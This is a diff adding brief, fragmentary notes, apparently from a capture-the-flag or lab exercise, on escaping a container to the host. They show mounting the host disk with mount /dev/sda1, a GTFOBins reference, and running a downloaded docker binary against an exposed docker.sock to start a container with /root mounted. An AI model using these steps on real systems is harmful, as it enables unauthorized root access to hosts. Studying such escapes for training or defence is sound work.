@@ -1,0 +1,20 @@
+#SIROL
+
+fdisk -l
+
+```
+mkdir /mnt/own
+mount /dev/sda1 /mnt/own
+cd /mnt/own
+```
+
+look for potential names .. and then replace alpine with that using gtfobins   # PEPO
+
+established ssh shell ..
+
+dwld docker in it and
+
+```
+root@9079b6b2d2fb:~# ./docker -H unix:///run//////docker.sock run -it -v /root:/mnt 3f4714ee068a bash
+root@9079b6b2d2fb:~# ./docker -H unix:///run//////docker.sock images
+```
